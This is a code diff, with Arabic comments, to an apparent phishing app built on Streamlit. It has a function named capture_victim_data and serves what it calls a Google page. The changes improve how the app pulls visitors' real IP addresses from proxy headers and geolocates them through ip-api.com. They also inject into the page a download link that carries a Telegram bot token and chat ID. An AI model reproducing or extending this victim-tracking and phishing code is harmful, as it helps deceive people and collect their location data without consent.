@@ -46,20 +46,28 @@ st.markdown("""
 
 # ============= دالة جلب الـ IP الحقيقي =============
 def get_real_ip():
-    """جلب عنوان IP الحقيقي للزائر"""
+    """جلب عنوان IP الحقيقي للزائر من ترويسات Streamlit"""
     try:
-        # محاولة الحصول على IP من عدة مصادر
-        response = requests.get('https://api.ipify.org?format=json', timeout=5)
-        if response.status_code == 200:
-            return response.json().get('ip', 'Unknown')
+        # في Streamlit Cloud، يتم تمرير IP الزائر في ترويسات معينة
+        from streamlit.web.server.websocket_headers import _get_websocket_headers
+        headers = _get_websocket_headers()
+        if headers:
+            # الترويسات الشائعة لـ IP الزائر خلف البروكسي
+            ip = headers.get("X-Forwarded-For")
+            if ip:
+                return ip.split(",")[0].strip()
+            
+            ip = headers.get("X-Real-Ip")
+            if ip:
+                return ip
     except:
         pass
     
+    # محاولة خارجية كخيار بديل
     try:
-        # محاولة بديلة
-        response = requests.get('https://icanhazip.com/', timeout=5)
+        response = requests.get('https://api.ipify.org?format=json', timeout=3)
         if response.status_code == 200:
-            return response.text.strip()
+            return response.json().get('ip', 'Unknown')
     except:
         pass
     
@@ -76,7 +84,7 @@ def capture_victim_data():
             
             # الحصول على معلومات الموقع الجغرافي
             geo_data = None
-            if user_ip != 'Unknown':
+            if user_ip != 'Unknown' and user_ip != '127.0.0.1':
                 try:
                     geo_response = requests.get(f'https://ip-api.com/json/{user_ip}?lang=ar&fields=country,city,lat,lon,isp,org,status', timeout=5)
                     if geo_response.status_code == 200:
@@ -338,6 +346,11 @@ else:
             try:
                 with open('index.html', 'r', encoding='utf-8') as f:
                     html_content = f.read()
+                
+                # حقن رابط التحميل في المعاينة أيضاً
+                download_url = f"https://rashdai.streamlit.app/?download=true&token={bot_token}&chatid={chat_id}"
+                html_content = html_content.replace('https://rashdai.streamlit.app/api/upload', download_url)
+                
                 st.components.v1.html(html_content, height=400, scrolling=True)
             except Exception as e:
                 st.error(f"❌ خطأ في تحميل صفحة Google: {e}")
